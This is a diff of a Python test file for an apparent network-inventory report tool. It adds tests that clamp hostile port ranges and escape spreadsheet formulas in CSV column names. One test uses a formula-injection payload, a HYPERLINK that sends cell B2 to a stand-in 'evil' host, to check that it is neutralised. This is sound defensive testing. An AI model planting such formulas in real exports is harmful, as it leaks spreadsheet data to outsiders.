@@ -27,6 +27,16 @@ def test_port_set_parses_numbers_not_substrings():
     assert 3389 in port_set("*")               # cloud rule "allow any port"
 
 
+def test_port_set_clamps_hostile_ranges():
+    """An imported report must not be able to allocate billions of ints (security review #3)."""
+    import time
+
+    start = time.perf_counter()
+    assert len(port_set("1-9999999999")) == 65535
+    assert port_set("70000") == set() and port_set("0-2") == {1, 2}
+    assert time.perf_counter() - start < 1
+
+
 def test_tags_cover_common_device_roles():
     assert tag(Hostname="router", OS="Linux/Unix", Ports="80,443") == "[Network]"
     assert tag(Hostname="edge01", OS="Cisco IOS 15.2") == "[Network]"          # not Apple iOS
@@ -67,6 +77,12 @@ def test_csv_neutralises_formulas_and_keeps_every_field():
     assert row["Hostname"].startswith("'+")
     assert row["InstanceID"] == "i-1" and row["Tags"] == '{"env":"prod"}'
     assert row["AgentCapable"] == "Yes"
+
+
+def test_csv_neutralises_formulas_in_column_names():
+    """Field names come from imported JSON too, so headers need the same guard (security review #4)."""
+    header = to_csv([{"IP": "10.0.0.1", '=HYPERLINK("http://evil/?"&B2,"x")': "1"}]).splitlines()[0]
+    assert "'=HYPERLINK" in header and ',=HYPERLINK' not in header
 
 
 def test_html_report_escapes_hostile_values():
